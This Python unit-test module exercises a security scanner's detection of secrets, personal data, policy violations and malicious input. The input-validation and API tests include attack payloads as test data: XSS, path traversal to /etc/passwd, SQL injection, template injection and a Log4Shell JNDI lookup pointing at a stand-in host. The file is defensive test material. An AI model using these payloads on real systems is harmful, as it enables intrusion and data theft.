"""Unit Tests for Security Scanning in Secure Analyzer Service.

This module tests security scanning capabilities including:
- Content security analysis and pattern detection
- Vulnerability assessment and risk scoring
- Policy enforcement and compliance validation
- Circuit breaker pattern implementation
- Input validation and sanitization

Tests cover the complete security infrastructure within the Secure Analyzer service.
"""

import pytest
import json
from datetime import datetime, timedelta
from unittest.mock import MagicMock, patch, AsyncMock
from typing import Dict, Any, List

from main import DetectRequest, DetectResponse


class TestSecurityScanning:
    """Test Security Scanning functionality."""

    @pytest.fixture
    def content_detector(self):
        """Create content detector instance with test configuration."""
        from main import ContentDetector
        return ContentDetector()

    @pytest.fixture
    def policy_enforcer(self):
        """Create policy enforcer instance with test configuration."""
        from main import PolicyEnforcer
        return PolicyEnforcer()

    @pytest.fixture
    def circuit_breaker(self):
        """Create circuit breaker instance with test configuration."""
        from main import CircuitBreaker
        return CircuitBreaker()

    @pytest.fixture
    def sample_sensitive_content(self):
        """Sample sensitive content for testing."""
        return {
            "passwords": "User password is: admin123, API key: sk-1234567890abcdef",
            "financial": "Credit card: 4111-1111-1111-1111, SSN: 123-45-6789",
            "healthcare": "Patient ID: 987654321, Diagnosis: COVID-19, PHI data",
            "personal": "Email: john.doe@company.com, Phone: (555) 123-4567",
            "secrets": "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE, SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "mixed": """
Database connection: postgresql://admin:supersecret@localhost:5432/mydb
API endpoint: https://api.company.com/v1/users
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Social Security: 987-65-4321
Medical record: Patient shows symptoms of diabetes mellitus
            """
        }

    @pytest.fixture
    def enterprise_security_policies(self):
        """Enterprise security policies for testing."""
        return {
            "content_policies": {
                "block_passwords": {"enabled": True, "action": "block", "severity": "high"},
                "block_financial": {"enabled": True, "action": "quarantine", "severity": "critical"},
                "block_healthcare": {"enabled": True, "action": "encrypt", "severity": "critical"},
                "block_personal": {"enabled": False, "action": "log", "severity": "medium"},
                "block_secrets": {"enabled": True, "action": "mask", "severity": "high"}
            },
            "rate_limits": {
                "requests_per_minute": 100,
                "burst_limit": 20,
                "backoff_seconds": 60
            },
            "compliance_frameworks": ["GDPR", "HIPAA", "PCI_DSS", "SOX"],
            "data_classification": {
                "public": {"retention_days": 365, "encryption": False},
                "internal": {"retention_days": 2555, "encryption": True},
                "confidential": {"retention_days": 2555, "encryption": True},
                "restricted": {"retention_days": 3650, "encryption": True}
            }
        }

    def test_content_security_detection(self, content_detector, sample_sensitive_content):
        """Test content security detection capabilities."""
        # Test password detection
        password_result = content_detector.detect_sensitive_content(sample_sensitive_content["passwords"])
        assert password_result["sensitive"] is True
        assert "credentials" in password_result["topics"]
        assert len(password_result["matches"]) >= 2

        # Test financial data detection
        financial_result = content_detector.detect_sensitive_content(sample_sensitive_content["financial"])
        assert financial_result["sensitive"] is True
        assert "financial" in financial_result["topics"]
        assert financial_result["risk_score"] >= 80  # High risk

        # Test healthcare data detection
        healthcare_result = content_detector.detect_sensitive_content(sample_sensitive_content["healthcare"])
        assert healthcare_result["sensitive"] is True
        assert "healthcare" in healthcare_result["topics"]
        assert healthcare_result["risk_score"] >= 90  # Critical risk

        # Test mixed content detection
        mixed_result = content_detector.detect_sensitive_content(sample_sensitive_content["mixed"])
        assert mixed_result["sensitive"] is True
        assert len(mixed_result["topics"]) >= 3  # Multiple types detected
        assert mixed_result["risk_score"] >= 85

    def test_vulnerability_assessment_engine(self, content_detector, sample_sensitive_content):
        """Test vulnerability assessment and risk scoring."""
        # Assess password vulnerability
        password_vulns = content_detector.assess_vulnerabilities(sample_sensitive_content["passwords"])
        assert len(password_vulns) >= 2

        # Check vulnerability structure
        for vuln in password_vulns:
            assert "type" in vuln
            assert "severity" in vuln
            assert "description" in vuln
            assert "line_number" in vuln
            assert "confidence" in vuln
            assert 0.0 <= vuln["confidence"] <= 1.0

        # Test risk scoring algorithm
        high_risk_content = "Super secret password: god123, Nuclear codes: 12345"
        risk_assessment = content_detector.calculate_risk_score(high_risk_content)

        assert risk_assessment["overall_score"] >= 90
        assert risk_assessment["severity"] == "critical"
        assert len(risk_assessment["contributing_factors"]) >= 2

    def test_policy_enforcement_engine(self, policy_enforcer, enterprise_security_policies):
        """Test policy enforcement and compliance validation."""
        # Test content policy enforcement
        sensitive_content = "Password: admin123, API Key: sk-abcdef123456"

        enforcement_result = policy_enforcer.enforce_policies(
            sensitive_content,
            enterprise_security_policies["content_policies"]
        )

        assert enforcement_result["action_taken"] in ["block", "quarantine", "mask"]
        assert enforcement_result["policies_triggered"] >= 2
        assert "severity_assessment" in enforcement_result

        # Test rate limiting
        rate_limit_result = policy_enforcer.check_rate_limits(
            "test_user",
            enterprise_security_policies["rate_limits"]
        )

        assert "allowed" in rate_limit_result
        assert "current_count" in rate_limit_result
        assert "reset_time" in rate_limit_result

        # Test compliance validation
        compliance_result = policy_enforcer.validate_compliance(
            sensitive_content,
            enterprise_security_policies["compliance_frameworks"]
        )

        assert len(compliance_result) == 4  # All frameworks checked
        for framework, assessment in compliance_result.items():
            assert "compliant" in assessment
            assert "violations" in assessment
            assert "recommendations" in assessment

    def test_input_validation_and_sanitization(self, content_detector):
        """Test input validation and sanitization capabilities."""
        # Test malicious input detection
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "../../../../etc/passwd",
            "UNION SELECT * FROM users--",
            "{{config.items()}}",
            "${jndi:ldap://evil.com/a}"
        ]

        for malicious_input in malicious_inputs:
            validation_result = content_detector.validate_input(malicious_input)
            assert validation_result["safe"] is False
            assert "threats_detected" in validation_result
            assert len(validation_result["threats_detected"]) > 0

        # Test input sanitization
        dirty_input = "Normal text <script>evil()</script> more text"
        sanitized = content_detector.sanitize_input(dirty_input)

        assert "<script>" not in sanitized
        assert "evil()" not in sanitized
        assert "Normal text" in sanitized
        assert "more text" in sanitized

        # Test input length limits
        large_input = "x" * 1000000  # 1MB input
        size_check = content_detector.check_input_size(large_input)

        assert size_check["within_limits"] is False
        assert "recommended_action" in size_check

    def test_circuit_breaker_pattern(self, circuit_breaker):
        """Test circuit breaker pattern implementation."""
        # Test initial state
        assert circuit_breaker.state == "closed"
        assert circuit_breaker.failure_count == 0

        # Test successful operations
        for i in range(5):
            result = circuit_breaker.call(lambda: {"success": True, "data": f"result_{i}"})
            assert result["success"] is True

        assert circuit_breaker.state == "closed"
        assert circuit_breaker.failure_count == 0

        # Test failure threshold
        failure_count = 0
        def failing_operation():
            nonlocal failure_count
            failure_count += 1
            raise Exception(f"Operation failed {failure_count}")

        # Trigger circuit breaker
        for i in range(circuit_breaker.failure_threshold + 1):
            try:
                circuit_breaker.call(failing_operation)
            except Exception:
                pass  # Expected failures

        # Circuit should now be open
        assert circuit_breaker.state == "open"
        assert circuit_breaker.failure_count >= circuit_breaker.failure_threshold

        # Test circuit breaker recovery
        import time
        time.sleep(circuit_breaker.recovery_timeout_seconds + 0.1)

        # Should attempt recovery
        def successful_operation():
            return {"recovered": True}

        result = circuit_breaker.call(successful_operation)
        assert result["recovered"] is True
        assert circuit_breaker.state == "closed"

    def test_keyword_document_processing(self, content_detector):
        """Test keyword document processing and custom pattern matching."""
        # Test custom keyword lists
        custom_keywords = {
            "company_secrets": ["internal_api_key", "company_database", "proprietary_code"],
            "project_names": ["ProjectX", "SecretSauce", "QuantumLeap"],
            "classifications": ["TOP_SECRET", "CONFIDENTIAL", "INTERNAL_USE"]
        }

        test_content = """
This document contains internal_api_key: xyz789,
references to ProjectX development,
and is marked as CONFIDENTIAL material.
Also mentions company_database access patterns.
        """

        keyword_result = content_detector.process_keyword_document(test_content, custom_keywords)

        assert keyword_result["sensitive"] is True
        assert len(keyword_result["keyword_matches"]) >= 4
        assert "company_secrets" in keyword_result["matched_categories"]
        assert "project_names" in keyword_result["matched_categories"]
        assert "classifications" in keyword_result["matched_categories"]

        # Test keyword document scoring
        assert keyword_result["keyword_score"] > 0
        assert keyword_result["category_count"] >= 3

    def test_compliance_reporting_engine(self, policy_enforcer, enterprise_security_policies):
        """Test compliance reporting and audit trail generation."""
        # Simulate compliance check history
        compliance_history = [
            {
                "timestamp": datetime.now() - timedelta(days=i),
                "content_type": "document" if i % 2 == 0 else "api_request",
                "policies_checked": ["block_passwords", "block_financial"],
                "violations_found": i % 3,  # Some violations
                "action_taken": "log" if i % 3 == 0 else "block",
                "user": f"user_{i}@company.com"
            }
            for i in range(30)  # 30 days of history
        ]

        # Generate compliance report
        report = policy_enforcer.generate_compliance_report(
            compliance_history,
            enterprise_security_policies["compliance_frameworks"]
        )

        assert "summary" in report
        assert "violations_by_policy" in report
        assert "compliance_trend" in report
        assert "recommendations" in report

        # Verify summary statistics
        summary = report["summary"]
        assert "total_checks" in summary
        assert summary["total_checks"] == 30
        assert "violation_rate" in summary
        assert 0.0 <= summary["violation_rate"] <= 1.0

        # Verify trend analysis
        trend = report["compliance_trend"]
        assert len(trend) >= 7  # At least weekly trend

    def test_multi_layer_security_validation(self, content_detector, policy_enforcer):
        """Test multi-layer security validation pipeline."""
        # Test comprehensive security pipeline
        test_scenarios = [
            {
                "content": "Normal business document with no sensitive data",
                "expected_layers": ["input_validation", "content_analysis"],
                "expected_sensitive": False
            },
            {
                "content": "Document with password: admin123 and API key: sk-abcdef",
                "expected_layers": ["input_validation", "content_analysis", "policy_enforcement"],
                "expected_sensitive": True
            },
            {
                "content": "<script>malicious_code()</script> with secrets: secret123",
                "expected_layers": ["input_validation", "sanitization", "content_analysis", "policy_enforcement"],
                "expected_sensitive": True
            }
        ]

        for scenario in test_scenarios:
            # Run multi-layer validation
            validation_result = content_detector.multi_layer_validate(scenario["content"])

            assert len(validation_result["layers_applied"]) >= len(scenario["expected_layers"])
            assert validation_result["final_assessment"]["sensitive"] == scenario["expected_sensitive"]

            # Verify layer execution order
            layers = validation_result["layers_applied"]
            assert "input_validation" in layers  # Always first

            if "<script>" in scenario["content"]:
                assert "sanitization" in layers

            if any(word in scenario["content"].lower() for word in ["password", "api", "secret"]):
                assert "content_analysis" in layers
                assert "policy_enforcement" in layers

    def test_performance_and_scalability(self, content_detector, sample_sensitive_content):
        """Test security scanning performance and scalability."""
        import time

        # Test single content scanning performance
        start_time = time.time()
        result = content_detector.detect_sensitive_content(sample_sensitive_content["mixed"])
        end_time = time.time()

        scanning_time = end_time - start_time
        assert scanning_time < 1.0  # Should complete within 1 second
        assert result["sensitive"] is True

        # Test batch processing performance
        batch_content = [sample_sensitive_content["passwords"]] * 10

        batch_start_time = time.time()
        batch_results = content_detector.batch_detect_sensitive_content(batch_content)
        batch_end_time = time.time()

        batch_time = batch_end_time - batch_start_time
        assert batch_time < 5.0  # Should complete batch within 5 seconds
        assert len(batch_results) == 10
        assert all(r["sensitive"] for r in batch_results)

        # Test memory efficiency
        large_content = "x" * 100000  # 100KB content
        memory_start = content_detector._get_memory_usage() if hasattr(content_detector, '_get_memory_usage') else 0

        large_result = content_detector.detect_sensitive_content(large_content)

        memory_end = content_detector._get_memory_usage() if hasattr(content_detector, '_get_memory_usage') else 0

        # Memory usage should not explode
        if memory_start > 0 and memory_end > 0:
            memory_increase = memory_end - memory_start
            assert memory_increase < large_content.__sizeof__() * 10  # Reasonable memory usage

    def test_security_incident_response(self, content_detector, circuit_breaker):
        """Test security incident response and escalation."""
        # Simulate security incident
        incident_content = """
URGENT SECURITY INCIDENT:
Detected multiple high-risk security violations:
- SQL injection attempts: 15 instances
- Unauthorized API access: 8 instances
- Data exfiltration attempts: 3 instances
- Malware signatures detected: 2 instances

Affected systems: web-server-01, api-gateway-02, database-03
Impact: High - Potential data breach
Severity: Critical
        """

        # Detect security incident
        detection_result = content_detector.detect_security_incident(incident_content)

        assert detection_result["incident_detected"] is True
        assert detection_result["severity"] == "critical"
        assert len(detection_result["violation_types"]) >= 4
        assert detection_result["affected_systems_count"] >= 3

        # Test incident response workflow
        incident_response = content_detector.generate_incident_response(detection_result)

        assert "immediate_actions" in incident_response
        assert "escalation_path" in incident_response
        assert "communication_plan" in incident_response
        assert "recovery_steps" in incident_response

        # Verify circuit breaker activation for high-severity incidents
        if detection_result["severity"] == "critical":
            # Circuit breaker should be triggered for critical incidents
            assert circuit_breaker.failure_count > 0 or circuit_breaker.state == "open"

    @pytest.mark.parametrize("content_type,expected_patterns", [
        ("password", ["password", "credential", "authentication"]),
        ("financial", ["credit_card", "ssn", "bank_account"]),
        ("healthcare", ["medical_record", "diagnosis", "phi"]),
        ("secrets", ["api_key", "secret_key", "access_token"]),
    ])
    def test_pattern_detection_parametrized(self, content_detector, content_type, expected_patterns):
        """Test pattern detection with parametrized test cases."""
        test_content = {
            "password": "User password is: mySecret123!",
            "financial": "Credit card number: 4111-1111-1111-1111",
            "healthcare": "Patient diagnosis: Type 2 Diabetes",
            "secrets": "API key: sk-1234567890abcdef"
        }

        content = test_content[content_type]
        result = content_detector.detect_sensitive_content(content)

        assert result["sensitive"] is True

        # Check that expected patterns are detected
        detected_patterns = [match["pattern"] for match in result.get("matches", [])]
        pattern_detected = any(any(pattern in dp.lower() for pattern in expected_patterns) for dp in detected_patterns)

        assert pattern_detected, f"Expected patterns {expected_patterns} not detected in result"

    def test_adaptive_security_learning(self, content_detector):
        """Test adaptive security learning and pattern updates."""
        # Simulate learning from security incidents
        learning_data = [
            {
                "incident": "New phishing attempt detected",
                "pattern": "urgent action required",
                "false_positive_rate": 0.1
            },
            {
                "incident": "Credential stuffing attack",
                "pattern": "multiple login failures",
                "false_positive_rate": 0.05
            },
            {
                "incident": "Data exfiltration attempt",
                "pattern": "large outbound transfer",
                "false_positive_rate": 0.02
            }
        ]

        # Train adaptive model
        training_result = content_detector.train_adaptive_model(learning_data)

        assert training_result["training_success"] is True
        assert "model_accuracy" in training_result
        assert training_result["model_accuracy"] >= 0.8
        assert "patterns_learned" in training_result
        assert len(training_result["patterns_learned"]) >= 3

        # Test adaptive detection
        new_content = "URGENT: Your account requires immediate action! Multiple login failures detected."

        adaptive_result = content_detector.adaptive_detect(new_content)

        assert "learned_patterns_detected" in adaptive_result
        assert len(adaptive_result["learned_patterns_detected"]) >= 1
        assert adaptive_result["adaptive_confidence"] > 0.5

    def test_enterprise_integration_patterns(self, policy_enforcer, enterprise_security_policies):
        """Test enterprise integration patterns and API security."""
        # Test API request security validation
        api_requests = [
            {
                "endpoint": "/api/users",
                "method": "GET",
                "headers": {"Authorization": "Bearer valid-jwt-token"},
                "body": {},
                "expected_secure": True
            },
            {
                "endpoint": "/api/admin",
                "method": "POST",
                "headers": {"Authorization": "Basic dXNlcjpwYXNz"},  # base64 user:pass
                "body": {"action": "delete_all_users"},
                "expected_secure": False
            },
            {
                "endpoint": "/api/data",
                "method": "POST",
                "headers": {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."},
                "body": {"query": "SELECT * FROM users WHERE 1=1 UNION SELECT password FROM admin--"},
                "expected_secure": False
            }
        ]

        for api_request in api_requests:
            security_assessment = policy_enforcer.assess_api_security(api_request)

            assert "overall_secure" in security_assessment
            assert security_assessment["overall_secure"] == api_request["expected_secure"]

            assert "auth_method" in security_assessment
            assert "vulnerabilities" in security_assessment

            if not api_request["expected_secure"]:
                assert len(security_assessment["vulnerabilities"]) > 0

        # Test enterprise policy integration
        policy_integration = policy_enforcer.integrate_enterprise_policies(enterprise_security_policies)

        assert policy_integration["integration_success"] is True
        assert "active_policies" in policy_integration
        assert len(policy_integration["active_policies"]) >= 3
        assert "policy_conflicts" in policy_integration
        assert "recommendations" in policy_integration
